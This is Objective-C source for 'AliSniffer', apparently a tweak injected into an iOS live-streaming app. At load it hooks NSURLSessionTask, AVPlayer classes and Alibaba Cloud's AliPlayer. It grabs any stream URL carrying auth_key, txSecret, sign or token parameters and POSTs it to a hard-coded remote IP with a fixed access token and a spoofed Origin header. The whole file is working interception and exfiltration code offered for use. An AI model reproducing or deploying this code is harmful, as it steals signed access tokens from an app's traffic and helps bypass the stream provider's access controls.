// AliSniffer.m — SAFE–LITE 稳定版
// 目标：必弹“已加载”；命中 m3u8/flv/rtmp/mp4/ts/php… 且优先 auth_key；不上 ResourceLoader（先保稳定不闪退）
// 上报：POST http://139.155.57.242:8088  X-Token: @Yy166431  依次 /api/push_raw → /push_raw → /push
// 需要链接：-framework UIKit -framework Foundation -framework WebKit -framework AVFoundation -framework CoreMedia

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

// ===== 配置 =====
static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString *> *kPushPaths(void) { return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0;  // 同 URL 60s 内不上报
static const BOOL kPopupBoot    = YES;             // 注入成功弹窗
static const BOOL kPopupOnAuth  = YES;             // auth_key/txSecret 等优先弹窗+复制
static const BOOL kPopupOnPlain = YES;             // 普通 URL 是否也弹窗

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

// ===== 工具 =====
static inline void on_main(void(^blk)(void)) {
    if (!blk) return;
    if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static BOOL hasAuthLike(NSString *u) {
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] ||
           [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    ||
           [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}
static BOOL looksLikeStream(NSString *u) {
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] ||
        [s containsString:@".ts"]   || [s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"] || [s containsString:@"phonelive"] ||
        [s containsString:@"replay"] || [s containsString:@"pull."] ||
        [s containsString:@"live"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u) {
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u];
        NSDate *now  = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}
static void popup(NSString *title, NSString *msg, NSString *copyText) {
    if (!msg) return;
    on_main(^{
        @try {
            UIWindow *win = nil;
            if (@available(iOS 13.0, *)) {
                for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes) {
                    if (sc.activationState == UISceneActivationStateForegroundActive) {
                        for (UIWindow *w in sc.windows) if (w.isKeyWindow) { win = w; break; }
                        if (win) break;
                    }
                }
            } else {
                win = UIApplication.sharedApplication.keyWindow;
            }
            if (!win) win = UIApplication.sharedApplication.windows.firstObject;
            UIViewController *vc = win.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText) {
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a) {
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        } @catch (__unused NSException *e) {}
    });
}
static void postText(NSString *text, void (^done)(BOOL ok)) {
    if (!text) { if(done)done(NO); return; }
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) { if(done)done(NO); return; }
        NSString *p   = paths[idx++];
        NSString *url = [kPushHost stringByAppendingString:p];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e) {
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (!e && sc >= 200 && sc < 300) { if(done)done(YES); } else tryNext();
        }] resume];
    }; tryNext();
}
static void handleURL(NSString *u, NSString *fromWho) {
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;
    const BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = fromWho ? [NSString stringWithFormat:@"%@\n%@", fromWho, u] : u;
    postText(u, ^(BOOL ok){
        LOG(@"POST %@ -> %@", u, ok?@"OK":@"FAIL");
        if (auth) {
            if (kPopupOnAuth) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
        } else {
            if (kPopupOnPlain){ popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
        }
    });
}

// ===== 兜底 Hook：NSURLSessionTask / AVPlayerItem / AVURLAsset =====
static void (*orig_task_resume)(id,SEL);
static void sn_task_resume(id self, SEL _cmd) {
    @try {
        NSURLRequest *req = nil;
        if ([self respondsToSelector:@selector(currentRequest)])
            req = ((NSURLRequest *(*)(id,SEL))objc_msgSend)(self, sel_getUid("currentRequest"));
        if (!req && [self respondsToSelector:@selector(originalRequest)])
            req = ((NSURLRequest *(*)(id,SEL))objc_msgSend)(self, sel_getUid("originalRequest"));
        NSString *s = req.URL.absoluteString;
        if (s.length) dispatch_async(gq, ^{ handleURL(s, @"NSURLSessionTask"); });
    } @catch (__unused NSException *e) {}
    if (orig_task_resume) orig_task_resume(self,_cmd);
}
static id (*orig_AVPI_url)(id,SEL,id);
static id sn_AVPI_url(id self, SEL _cmd, NSURL *URL) {
    @try { if (URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVPlayerItem"); }); } @catch (...) {}
    return orig_AVPI_url ? orig_AVPI_url(self,_cmd,URL) : nil;
}
static id (*orig_AVUA_urlopt)(id,SEL,id,id);
static id sn_AVUA_urlopt(id self, SEL _cmd, NSURL *URL, id opts) {
    @try { if (URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVURLAsset"); }); } @catch (...) {}
    return orig_AVUA_urlopt ? orig_AVUA_urlopt(self,_cmd,URL,opts) : nil;
}

// ===== 阿里云关键点：AVPUrlSource / AliPlayer =====
static void hook_AVPUrlSource(void) {
    Class c = objc_getClass("AVPUrlSource"); if (!c) return;
    SEL cs = sel_getUid("urlWithString:");
    Method mcls = class_getClassMethod(c, cs);
    if (mcls) {
        IMP orig = method_getImplementation(mcls);
        IMP now  = imp_implementationWithBlock(^id(id _self, NSString *s){
            @try { if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.urlWithString"); }); } @catch (...) {}
            if (orig) { id (*fn)(id,SEL,NSString*) = (id(*)(id,SEL,NSString*))orig; return fn(_self,cs,s); }
            return (id)nil;
        });
        method_setImplementation(mcls, now);
    }
    SEL is = sel_getUid("setUrl:");
    Method minst = class_getInstanceMethod(c, is);
    if (minst) {
        IMP orig = method_getImplementation(minst);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try { if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.setUrl"); }); } @catch (...) {}
            if (orig) { void (*fn)(id,SEL,NSString*) = (void(*)(id,SEL,NSString*))orig; fn(_self,is,s); }
        });
        method_setImplementation(minst, now);
    }
}
static void hook_AliPlayer(void) {
    Class c = objc_getClass("AliPlayer"); if (!c) return;
    SEL su = sel_getUid("setUrl:");
    Method mu = class_getInstanceMethod(c, su);
    if (mu) {
        IMP orig = method_getImplementation(mu);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try { if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AliPlayer.setUrl"); }); } @catch (...) {}
            if (orig) { void (*fn)(id,SEL,NSString*) = (void(*)(id,SEL,NSString*))orig; fn(_self,su,s); }
        });
        method_setImplementation(mu, now);
    }
    NSArray<NSString*> *sels = @[@"setStsSource:", @"setAuthSource:", @"setMpsSource:"];
    for (NSString *name in sels) {
        SEL s = sel_getUid(name.UTF8String);
        Method m = class_getInstanceMethod(c, s);
        if (!m) continue;
        IMP orig = method_getImplementation(m);
        IMP now  = imp_implementationWithBlock(^(id _self, id src){
            @try {
                NSString *u = nil;
                if ([src respondsToSelector:@selector(valueForKey:)]) {
                    @try { u = [src valueForKey:@"url"]; } @catch (...) {}
                    if (!u) { @try { u = [src valueForKey:@"playUrl"]; } @catch (...) {} }
                }
                if (u.length) dispatch_async(gq, ^{ handleURL(u, [@"AliPlayer." stringByAppendingString:name]); });
            } @catch (...) {}
            if (orig) { void (*fn)(id,SEL,id) = (void(*)(id,SEL,id))orig; fn(_self,s,src); }
        });
        method_setImplementation(m, now);
    }
}

// ===== 稳定版：用 +load 保证弹窗一定出现 =====
@interface AliSnifferBootstrap : NSObject @end
@implementation AliSnifferBootstrap
+ (void)load {
    // 放到 +load，且延迟 1 秒弹窗，避免启动期视图层级还没就绪
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (kPopupBoot) {
            popup(@"AliSniffer 已加载",
                  @"稳定版已启用：auth_key 优先 + 多入口兜底（HTTP/AV/阿里云）",
                  nil);
        }
    });

    @try {
        if (!gq)    gq    = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];

        // NSURLSessionTask -resume
        Class task = objc_getClass("NSURLSessionTask");
        if (task) {
            Method m = class_getInstanceMethod(task, sel_getUid("resume"));
            if (m) { orig_task_resume=(void(*)(id,SEL))method_getImplementation(m);
                    method_setImplementation(m,(IMP)sn_task_resume); }
        }
        // AVPlayerItem
        Class avpi = objc_getClass("AVPlayerItem");
        if (avpi) {
            Method m = class_getClassMethod(avpi, sel_getUid("playerItemWithURL:"));
            if (m) { orig_AVPI_url=(id(*)(id,SEL,id))method_getImplementation(m);
                    method_setImplementation(m,(IMP)sn_AVPI_url); }
        }
        // AVURLAsset
        Class avua = objc_getClass("AVURLAsset");
        if (avua) {
            Method m = class_getClassMethod(avua, sel_getUid("URLAssetWithURL:options:"));
            if (m) { orig_AVUA_urlopt=(id(*)(id,SEL,id,id))method_getImplementation(m);
                    method_setImplementation(m,(IMP)sn_AVUA_urlopt); }
        }
        // 阿里云关键点
        hook_AVPUrlSource();
        hook_AliPlayer();

        // 说明：这里**暂不安装** ResourceLoader 与 WK 注入，先保稳定；
        // 若这版稳定且还抓不到，再按你反馈把 RL 代理按“签名严格匹配”方式加回。

    } @catch (__unused NSException *e) {}
}
@end
